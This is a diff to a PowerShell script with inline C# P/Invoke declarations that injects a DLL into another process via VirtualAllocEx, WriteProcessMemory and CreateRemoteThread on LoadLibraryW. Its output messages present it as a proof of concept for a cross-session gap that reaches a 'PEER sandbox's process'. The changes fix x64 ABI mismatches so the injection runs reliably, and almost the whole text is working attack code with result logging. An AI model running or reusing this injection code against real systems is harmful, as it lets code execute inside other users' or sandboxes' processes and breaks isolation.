@@ -19,8 +19,11 @@ public static class Inj {
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
 
+    // nSize / lpNumberOfBytesWritten are SIZE_T* in the real Win32 signature -
+    // pointer-sized (8 bytes on x64). Using a 32-bit uint here mismatches the
+    // native ABI on x64 and corrupts the call.
     [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr GetModuleHandle(string lpModuleName);
@@ -29,7 +32,7 @@ public static class Inj {
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
@@ -62,28 +65,31 @@ if ($hProc -eq [IntPtr]::Zero) {
 Write-Output "RESULT: OpenProcess SUCCEEDED - handle=$hProc (this alone demonstrates the cross-session access gap)"
 
 $pathBytes = [System.Text.Encoding]::Unicode.GetBytes($DllPath + "`0")
-$remoteBuf = [Inj]::VirtualAllocEx($hProc, [IntPtr]::Zero, [UIntPtr]($pathBytes.Length), ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_READWRITE)
+Write-Output "DLL path byte length: $($pathBytes.Length)"
+$remoteBuf = [Inj]::VirtualAllocEx($hProc, [IntPtr]::Zero, [UIntPtr]([uint64]$pathBytes.Length), ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_READWRITE)
+$vaErr = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+Write-Output ("RESULT: VirtualAllocEx returned 0x{0:X} (GetLastError={1})" -f $remoteBuf.ToInt64(), $vaErr)
 if ($remoteBuf -eq [IntPtr]::Zero) {
-    Write-Output "RESULT: VirtualAllocEx FAILED, Win32 error=$([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
     [Inj]::CloseHandle($hProc) | Out-Null
     exit 1
 }
-Write-Output "RESULT: VirtualAllocEx SUCCEEDED - remote buffer=$remoteBuf"
 
 [UIntPtr]$written = [UIntPtr]::Zero
-$wrote = [Inj]::WriteProcessMemory($hProc, $remoteBuf, $pathBytes, [uint32]$pathBytes.Length, [ref]$written)
+$wrote = [Inj]::WriteProcessMemory($hProc, $remoteBuf, $pathBytes, [UIntPtr]([uint64]$pathBytes.Length), [ref]$written)
+$wpmErr = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+Write-Output "RESULT: WriteProcessMemory returned $wrote, wrote=$($written.ToUInt64()) bytes, GetLastError=$wpmErr"
 if (-not $wrote) {
-    Write-Output "RESULT: WriteProcessMemory FAILED, Win32 error=$([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+    [Inj]::CloseHandle($hProc) | Out-Null
     exit 1
 }
-Write-Output "RESULT: WriteProcessMemory SUCCEEDED - wrote $written bytes of DLL path into the PEER sandbox's process"
+Write-Output "RESULT: WriteProcessMemory SUCCEEDED - wrote the DLL path into the PEER sandbox's process"
 
 $hKernel32 = [Inj]::GetModuleHandle("kernel32.dll")
 $pLoadLibraryW = [Inj]::GetProcAddress($hKernel32, "LoadLibraryW")
 Write-Output "LoadLibraryW address: $pLoadLibraryW"
 
 [IntPtr]$tid = [IntPtr]::Zero
-$hThread = [Inj]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $pLoadLibraryW, $remoteBuf, 0, [ref]$tid)
+$hThread = [Inj]::CreateRemoteThread($hProc, [IntPtr]::Zero, [UIntPtr]::Zero, $pLoadLibraryW, $remoteBuf, 0, [ref]$tid)
 if ($hThread -eq [IntPtr]::Zero) {
     Write-Output "RESULT: CreateRemoteThread FAILED, Win32 error=$([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
     exit 1
